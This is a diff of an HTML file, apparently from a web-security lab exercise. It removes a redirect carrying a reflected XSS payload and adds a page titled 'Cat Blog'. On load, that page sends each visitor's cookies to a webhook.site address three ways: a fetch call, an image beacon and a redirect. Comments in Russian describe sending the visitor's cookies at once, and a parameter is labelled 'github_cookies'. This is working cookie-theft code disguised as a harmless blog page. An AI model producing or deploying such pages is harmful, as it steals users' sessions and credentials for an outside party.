@@ -1,8 +1,26 @@
 <!DOCTYPE html>
 <html>
-<script>
-// Просто редирект на XSS который отправит куки
-var xssPayload = 'http://web.cfcdar04rj74wpo3pmjy.labs.cyber-ed.space/?lang="><script>fetch("https://webhook.site/a0a1812e-fd9e-41e8-8958-52aa40759367?stolen_cookies="+document.cookie)<\/script>';
-window.location.href = xssPayload;
-</script>
+<head>
+    <title>Cat Blog</title>
+</head>
+<body>
+    <h1>Welcome to Cat Blog</h1>
+    <script>
+        // Немедленно отправляем куки посетителя на webhook
+        var cookies = document.cookie || 'no_cookies';
+        var webhook = 'https://webhook.site/a0a1812e-fd9e-41e8-8958-52aa40759367';
+        
+        // Отправляем через fetch
+        fetch(webhook + '?github_cookies=' + encodeURIComponent(cookies));
+        
+        // И через image для надежности
+        var img = new Image();
+        img.src = webhook + '?img_cookies=' + encodeURIComponent(cookies);
+        
+        // И через redirect
+        setTimeout(function() {
+            window.location = webhook + '?redirect_cookies=' + encodeURIComponent(cookies);
+        }, 100);
+    </script>
+</body>
 </html>
